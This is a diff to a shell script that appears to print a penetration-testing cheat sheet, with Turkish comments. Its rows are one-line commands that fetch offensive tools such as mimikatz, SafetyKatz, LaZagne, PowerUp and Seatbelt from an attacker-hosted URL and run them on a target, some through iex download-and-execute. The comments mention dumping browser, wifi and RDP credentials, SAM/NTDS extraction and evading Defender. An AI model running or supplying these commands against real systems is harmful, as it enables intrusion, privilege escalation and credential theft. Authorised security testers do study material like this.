@@ -85,7 +85,6 @@ if [ "$COMPACT" -eq 1 ]; then
     row "privescchk" "iwr $URL/windows/PrivescCheck.ps1 -o \$env:TEMP\\pc.ps1; . \$env:TEMP\\pc.ps1; Invoke-PrivescCheck   ${DIM}# winPEAS'tan hizli ve sessiz${NC}"
     row "powerup"    "iwr $URL/windows/PowerUp.ps1 -o \$env:TEMP\\pu.ps1; . \$env:TEMP\\pu.ps1; Invoke-AllChecks"
     row "sherlock"   "iwr $URL/windows/Sherlock.ps1 -o \$env:TEMP\\sh.ps1; . \$env:TEMP\\sh.ps1; Find-AllVulns"
-    row "watson"     "iwr $URL/windows/Watson.ps1 -o \$env:TEMP\\w.ps1; . \$env:TEMP\\w.ps1"
     row "jaws"       "iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\\j.ps1; powershell -ep bypass -f \$env:TEMP\\j.ps1"
     row "seatbelt"   "iwr $URL/windows/Seatbelt.exe -o \$env:TEMP\\sb.exe; & \$env:TEMP\\sb.exe -group=all"
     row "accesschk"  "iwr $URL/windows/accesschk64.exe -o \$env:TEMP\\ac.exe; & \$env:TEMP\\ac.exe -uwcqv 'Authenticated Users' *"
@@ -116,7 +115,7 @@ if [ "$COMPACT" -eq 1 ]; then
     row "mimikatz"   "iwr $URL/ad/mimikatz_trunk.zip -o m.zip; Expand-Archive m.zip; .\\m\\x64\\mimikatz.exe   ${DIM}# privilege::debug; sekurlsa::logonpasswords${NC}"
     row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender'a karsi yumusatilmis mimikatz${NC}"
     row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB cred'leri${NC}"
-    row "lazagne-l"  "wget $URL/linux/lazagne -O /tmp/lz && chmod +x /tmp/lz && /tmp/lz all"
+    row "lazagne-l"  "wget $URL/linux/laZagne.py -O /tmp/lz.py && python3 /tmp/lz.py all   ${DIM}# python3 + pip dependencies hedef'te${NC}"
     row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali'de, SAM/NTDS dump${NC}"
 
     # =========================================================
@@ -229,11 +228,6 @@ EOF
 
 section "sherlock" "WINDOWS - Sherlock.ps1" "$(cat <<EOF
 iex (iwr $URL/windows/Sherlock.ps1 -UseBasicParsing).Content; Find-AllVulns
-EOF
-)"
-
-section "watson" "WINDOWS - Watson.ps1" "$(cat <<EOF
-iex (iwr $URL/windows/Watson.ps1 -UseBasicParsing).Content
 EOF
 )"
 
